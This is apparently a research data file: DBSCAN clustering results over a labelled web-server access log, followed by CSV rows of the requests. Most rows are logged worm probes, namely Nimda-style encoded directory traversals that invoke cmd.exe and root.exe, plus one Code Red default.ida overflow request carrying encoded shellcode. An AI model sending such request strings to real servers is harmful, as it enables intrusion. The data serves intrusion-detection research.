#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1107076919,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218022022040,"-","AE","S198","A_0"
1107078995,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078996,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078997,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078997,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078998,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078998,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078999,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107078999,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079000,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079000,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079001,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079001,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079002,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9211059000204,"-","AB","S154","A_2"
1107079003,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9211059000204,"-","AB","S154","A_2"
1107079003,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107079004,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9211059000204,"-","AA","S154","A_1"
1107092005,"-",1061,"-","GET","/NULL.printer","'404'",9061088122010,"-","AA","S417","A_1"
1107101364,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024199102163,"-","AE","S335","A_0"
1107112416,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112417,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112420,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112421,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112421,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112422,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112422,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112422,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112423,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112423,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112424,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112424,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112425,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069233130234,"-","AB","S544","A_2"
1107112425,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069233130234,"-","AB","S544","A_2"
1107112426,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107112426,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069233130234,"-","AA","S544","A_1"
1107116016,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218026187153,"-","AE","S205","A_0"
1107117575,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9202253200065,"-","AE","S80","A_0"
1107119002,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218074023091,"-","AE","S219","A_0"
1107129012,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061190072114,"-","AE","S402","A_0"
1107131423,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131423,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131423,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131424,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131424,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131424,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131424,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131425,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131425,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131425,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131425,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131426,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131426,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9067181019171,"-","AB","S506","A_2"
1107131426,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9067181019171,"-","AB","S506","A_2"
1107131426,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107131427,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9067181019171,"-","AA","S506","A_1"
1107134072,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107134072,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107134076,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107134076,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107134076,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107134080,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9211022073068,"-","AA","S151","A_1"
1107137140,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9211022102234,"-","AE","S150","A_0"
1107137918,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9065202015194,"-","AA","S460","A_1"
1107141975,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007127,"-","AE","S362","A_0"
1107143898,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143900,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143903,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143905,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143908,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143910,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
